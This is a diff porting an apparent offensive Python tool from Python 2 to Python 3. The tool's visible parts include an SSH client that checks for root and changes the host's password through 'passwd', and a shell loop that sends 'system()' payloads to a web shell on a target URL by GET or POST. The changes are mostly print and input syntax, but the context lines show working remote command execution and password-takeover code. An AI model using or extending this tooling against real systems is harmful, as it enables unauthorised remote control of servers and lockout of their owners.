@@ -1,3 +1,4 @@
+#!/usr/bin/env python
 #coding:utf-8
 
 import paramiko
@@ -33,13 +34,13 @@ class SSHClient():
 
     def exec_command_print(self, command):
         stdin, stdout, stderr = self.exec_command(command)
-        print "-" * 0x10
-        print stdout.read()
-        print "-" * 0x10
+        print ("-" * 0x10)
+        print (stdout.read())
+        print ("-" * 0x10)
 
     def interaction(self):
         while(True):
-            SshCommand = raw_input('('+self.host+')$')
+            SshCommand = str(input('('+self.host+')$'))
             if SshCommand == 'q' or SshCommand == 'quit':
                 break
             else:
@@ -55,7 +56,7 @@ class SSHClient():
         is_root = self.check_root()
         if is_root[0]:
             self.is_root = True
-            print "[+] Root user detected!"
+            print ("[+] Root user detected!")
             stdin, stdout, stderr = self.exec_command("passwd")
             stdin.write("%s\n" % (new_password))
             stdin.write("%s\n" % (new_password))
@@ -68,7 +69,7 @@ class SSHClient():
                 return False
         else:
             self.is_root = False
-            print "[+] Not a root user! (%s)" % (is_root[1])
+            print ("[+] Not a root user! (%s)" % (is_root[1]))
             stdin, stdout, stderr = self.exec_command("passwd")
             stdin.write("%s\n" % (self.password))
             stdin.write("%s\n" % (new_password))
@@ -112,11 +113,11 @@ class SSHClient():
 
 class Output():
     def print_info(self,str):
-        print "[\033[1;33minfo\033[0m]"+str
+        print ("[\033[1;33minfo\033[0m]"+str)
     def print_error(self,str):
-        print "[\033[1;31merror\033[0m]"+str
+        print ("[\033[1;31merror\033[0m]"+str)
     def print_result(self,str):
-        print "[\033[1;32mresult\033[0m]"+str
+        print ("[\033[1;32mresult\033[0m]"+str)
 
 
 class ShellCLI(cmd.Cmd):
@@ -162,11 +163,11 @@ class ShellCLI(cmd.Cmd):
     def shell_cmd_loop(self):
         s = requests.Session()
         while(True):
-            ShellCommand = raw_input(self.prompt)
+            ShellCommand = str(input(self.prompt))
             if ShellCommand == 'q' or ShellCommand == 'quit':
                 break
             elif ShellCommand == 'write_log' or ShellCommand == 'w_l':
-                self.save_log() #人工选择可用shell写入
+                self.save_log() #选择可用shell写入
             else:
                 payload = 'system(\''+ShellCommand+'\');'
                 if self.method == 'post':
@@ -174,4 +175,4 @@ class ShellCLI(cmd.Cmd):
                 elif self.method == 'get':
                     print(s.get(self.url+'?'+self.passwd+'='+payload).text)
                 else:
-                    print 'what method?'
+                    print ('what method?')
